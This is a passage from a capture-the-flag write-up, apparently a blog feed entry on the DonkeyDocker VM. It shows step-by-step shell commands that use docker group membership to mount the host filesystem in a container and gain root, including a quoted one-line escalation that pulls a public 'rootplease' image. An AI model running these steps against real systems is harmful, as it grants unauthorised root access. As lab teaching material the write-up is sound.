-rw&mdash;&mdash;&mdash;&ndash;    1 orwell   orwell          45 Apr 15 18:12 .ash_history
drwx&mdash;S&mdash;&ndash;    2 orwell   users         4096 Mar 22  2017 .ssh
-rw-r&mdash;r&mdash;    1 orwell   orwell         104 Mar 22  2017 flag.txt
donkeydocker:~$ cat flag.txt
You tried harder! Good work ;&ndash;)</p>

<p>Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}
```</p>

<p>Now we seem to be on the Docker host itself. Let&rsquo;s confirm:</p>

<p><code>
donkeydocker:~$ docker ps
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80-&gt;80/tcp   donkeydocker
</code></p>

<p>We can see the container we were in previously. Now, for the next step, I used as reference this blog post about <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Docker privilege escalation</a>. The highlights are :</p>

<blockquote><p>If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</p>

<p>The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</p>

<p>The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
This effectively gives you root on the machine.</p></blockquote>

<p>And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:</p>

<p><code>
donkeydocker:~$ id
uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
</code></p>

<p>Let&rsquo;s look at the available containers now:</p>

<p><code>
donkeydocker:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker
</code></p>

<p>We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:</p>

<p><code>
donkeydocker:~$ docker run -d -v /:/host donkeydocker
103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863
</code></p>

<p>Now we should find the host / contents in the /host directory inside the container. Let&rsquo;s verify that it was created:</p>

<p><code>
donkeydocker:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker
</code></p>

<p>And now we can run a root shell inside the container and read the host flag:</p>

<p>```
donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
root@103cd9c625b0:/# ls /host/root
donkeydocker  flag.txt
root@103cd9c625b0:/# cat /host/root/flag.txt
YES!! You did it :&ndash;). Congratulations!</p>

<p>I hope you enjoyed this CTF VM.</p>

<p>Drop me a line on twitter @dhn_, or via email <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x64;&#104;&#110;&#x40;&#x7a;&#101;&#114;&#x30;&#x2d;&#x64;&#97;&#121;&#46;&#112;&#x77;">&#100;&#104;&#x6e;&#x40;&#x7a;&#x65;&#114;&#48;&#x2d;&#100;&#x61;&#x79;&#46;&#112;&#119;</a></p>

<p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
```</p>

<p>Nice Docker twist on this VM! To recap the steps:</p>

<ul>
<li>Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data</li>
<li>the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password</li>
<li>the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key</li>
<li>user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container</li>
</ul>


<p>```</p>

<hr />

<p>/ Your motives for doing whatever good \
| deed you may have in mind will be    |
\ misinterpreted by somebody.          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
